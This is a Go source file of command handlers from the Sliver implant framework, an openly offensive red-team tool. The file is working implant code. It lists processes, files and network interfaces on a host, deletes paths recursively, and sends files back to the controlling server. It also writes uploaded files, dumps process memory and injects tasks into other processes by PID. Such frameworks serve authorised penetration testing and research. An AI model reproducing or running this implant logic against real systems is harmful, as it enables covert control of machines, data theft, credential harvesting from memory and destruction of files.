package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"compress/gzip"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"net"

	// {{if .Debug}}
	"log"
	// {{end}}

	"os"
	"path/filepath"

	pb "github.com/bishopfox/sliver/protobuf/sliver"
	"github.com/bishopfox/sliver/sliver/procdump"
	"github.com/bishopfox/sliver/sliver/ps"
	"github.com/bishopfox/sliver/sliver/taskrunner"

	"github.com/golang/protobuf/proto"
)

// func killHandler(data []byte, resp RPCResponse) {
// 	// {{if .Debug}}
// 	log.Printf("Received kill command")
// 	// {{end}}
// 	os.Exit(0)
// }

func pingHandler(data []byte, resp RPCResponse) {
	ping := &pb.Ping{}
	err := proto.Unmarshal(data, ping)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	// {{if .Debug}}
	log.Printf("ping id = %d", ping.Nonce)
	// {{end}}
	data, err = proto.Marshal(ping)
	resp(data, err)
}

func psHandler(data []byte, resp RPCResponse) {
	psListReq := &pb.PsReq{}
	err := proto.Unmarshal(data, psListReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	procs, err := ps.Processes()
	if err != nil {
		// {{if .Debug}}
		log.Printf("failed to list procs %v", err)
		// {{end}}
	}

	psList := &pb.Ps{
		Processes: []*pb.Process{},
	}

	for _, proc := range procs {
		psList.Processes = append(psList.Processes, &pb.Process{
			Pid:        int32(proc.Pid()),
			Ppid:       int32(proc.PPid()),
			Executable: proc.Executable(),
			Owner:      proc.Owner(),
		})
	}
	data, err = proto.Marshal(psList)
	resp(data, err)
}

func dirListHandler(data []byte, resp RPCResponse) {
	dirListReq := &pb.LsReq{}
	err := proto.Unmarshal(data, dirListReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	dir, files, err := getDirList(dirListReq.Path)

	// Convert directory listing to protobuf
	dirList := &pb.Ls{Path: dir}
	if err == nil {
		dirList.Exists = true
	} else {
		dirList.Exists = false
	}
	dirList.Files = []*pb.FileInfo{}
	for _, fileInfo := range files {
		dirList.Files = append(dirList.Files, &pb.FileInfo{
			Name:  fileInfo.Name(),
			IsDir: fileInfo.IsDir(),
			Size:  fileInfo.Size(),
		})
	}

	// Send back the response
	data, err = proto.Marshal(dirList)
	resp(data, err)
}

func getDirList(target string) (string, []os.FileInfo, error) {
	dir, _ := filepath.Abs(target)
	if _, err := os.Stat(dir); !os.IsNotExist(err) {
		files, err := ioutil.ReadDir(dir)
		return dir, files, err
	}
	return dir, []os.FileInfo{}, errors.New("Directory does not exist")
}

func rmHandler(data []byte, resp RPCResponse) {
	rmReq := &pb.RmReq{}
	err := proto.Unmarshal(data, rmReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	rm := &pb.Rm{}
	target, _ := filepath.Abs(rmReq.Path)
	rm.Path = target
	_, err = os.Stat(target)
	if err == nil {
		err = os.RemoveAll(target)
		if err == nil {
			rm.Success = true
		} else {
			rm.Success = false
			rm.Err = fmt.Sprintf("%v", err)
		}
	} else {
		rm.Success = false
		rm.Err = fmt.Sprintf("%v", err)
	}

	data, err = proto.Marshal(rm)
	resp(data, err)
}

func mkdirHandler(data []byte, resp RPCResponse) {
	mkdirReq := &pb.MkdirReq{}
	err := proto.Unmarshal(data, mkdirReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	mkdir := &pb.Mkdir{}
	target, _ := filepath.Abs(mkdirReq.Path)
	mkdir.Path = target

	err = os.MkdirAll(target, os.ModePerm)
	if err == nil {
		mkdir.Success = true
	} else {
		mkdir.Success = false
		mkdir.Err = fmt.Sprintf("%v", err)
	}

	data, err = proto.Marshal(mkdir)
	resp(data, err)
}

func cdHandler(data []byte, resp RPCResponse) {
	cdReq := &pb.CdReq{}
	err := proto.Unmarshal(data, cdReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		resp([]byte{}, err)
		return
	}

	os.Chdir(cdReq.Path)
	dir, err := os.Getwd()
	pwd := &pb.Pwd{Path: dir}
	if err != nil {
		resp([]byte{}, err)
		return
	}

	// {{if .Debug}}
	log.Printf("cd '%s' -> %s", cdReq.Path, dir)
	// {{end}}

	data, err = proto.Marshal(pwd)
	resp(data, err)
}

func pwdHandler(data []byte, resp RPCResponse) {
	pwdReq := &pb.PwdReq{}
	err := proto.Unmarshal(data, pwdReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		resp([]byte{}, err)
		return
	}

	dir, err := os.Getwd()
	pwd := &pb.Pwd{Path: dir}
	if err != nil {
		pwd.Err = fmt.Sprintf("%v", err)
	}

	data, err = proto.Marshal(pwd)
	resp(data, err)
}

// Send a file back to the hive
func downloadHandler(data []byte, resp RPCResponse) {
	downloadReq := &pb.DownloadReq{}
	err := proto.Unmarshal(data, downloadReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		resp([]byte{}, err)
		return
	}
	target, _ := filepath.Abs(downloadReq.Path)
	rawData, err := ioutil.ReadFile(target)

	var download *pb.Download
	if err == nil {
		gzipData := bytes.NewBuffer([]byte{})
		gzipWrite(gzipData, rawData)
		download = &pb.Download{
			Path:    target,
			Data:    gzipData.Bytes(),
			Encoder: "gzip",
			Exists:  true,
		}
	} else {
		download = &pb.Download{Path: target, Exists: false}
	}

	data, _ = proto.Marshal(download)
	resp(data, err)
}

func uploadHandler(data []byte, resp RPCResponse) {
	uploadReq := &pb.UploadReq{}
	err := proto.Unmarshal(data, uploadReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		resp([]byte{}, err)
		return
	}

	uploadPath, _ := filepath.Abs(uploadReq.Path)
	upload := &pb.Upload{Path: uploadPath}
	f, err := os.Create(uploadPath)
	if err != nil {
		upload.Err = fmt.Sprintf("%v", err)
		upload.Success = false
	} else {
		defer f.Close()
		data, err := gzipRead(uploadReq.Data)
		if err != nil {
			upload.Err = fmt.Sprintf("%v", err)
			upload.Success = false
		} else {
			f.Write(data)
			upload.Success = true
		}
	}

	data, _ = proto.Marshal(upload)
	resp(data, err)
}

func dumpHandler(data []byte, resp RPCResponse) {
	procDumpReq := &pb.ProcessDumpReq{}
	err := proto.Unmarshal(data, procDumpReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	res, err := procdump.DumpProcess(procDumpReq.Pid)
	dumpResp := &pb.ProcessDump{Data: res.Data()}
	if err == nil {
		dumpResp.Err = ""
	} else {
		dumpResp.Err = fmt.Sprintf("%v", err)
	}
	data, err = proto.Marshal(dumpResp)
	resp(data, err)
}

func taskHandler(data []byte, resp RPCResponse) {
	task := &pb.Task{}
	err := proto.Unmarshal(data, task)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	err = taskrunner.LocalTask(task.Data)
	resp([]byte{}, err)
}

func remoteTaskHandler(data []byte, resp RPCResponse) {
	remoteTask := &pb.RemoteTask{}
	err := proto.Unmarshal(data, remoteTask)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	err = taskrunner.RemoteTask(int(remoteTask.Pid), remoteTask.Data)
	resp([]byte{}, err)
}

func ifconfigHandler(_ []byte, resp RPCResponse) {
	interfaces := ifconfig()
	// {{if .Debug}}
	log.Printf("network interfaces: %#v", interfaces)
	// {{end}}
	data, err := proto.Marshal(interfaces)
	resp(data, err)
}

func ifconfig() *pb.Ifconfig {
	netInterfaces, err := net.Interfaces()
	if err != nil {
		return nil
	}

	interfaces := &pb.Ifconfig{
		NetInterfaces: []*pb.NetInterface{},
	}
	for _, iface := range netInterfaces {
		netIface := &pb.NetInterface{
			Index: int32(iface.Index),
			Name:  iface.Name,
		}
		if iface.HardwareAddr != nil {
			netIface.MAC = iface.HardwareAddr.String()
		}
		addresses, err := iface.Addrs()
		if err == nil {
			for _, address := range addresses {
				netIface.IPAddresses = append(netIface.IPAddresses, address.String())
			}
		}
		interfaces.NetInterfaces = append(interfaces.NetInterfaces, netIface)
	}
	return interfaces
}

// ---------------- Data Encoders ----------------

func gzipWrite(w io.Writer, data []byte) error {
	gw, err := gzip.NewWriterLevel(w, gzip.BestSpeed)
	defer gw.Close()
	gw.Write(data)
	return err
}

func gzipRead(data []byte) ([]byte, error) {
	bytes.NewReader(data)
	reader, _ := gzip.NewReader(bytes.NewReader(data))
	var buf bytes.Buffer
	_, err := buf.ReadFrom(reader)
	if err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}
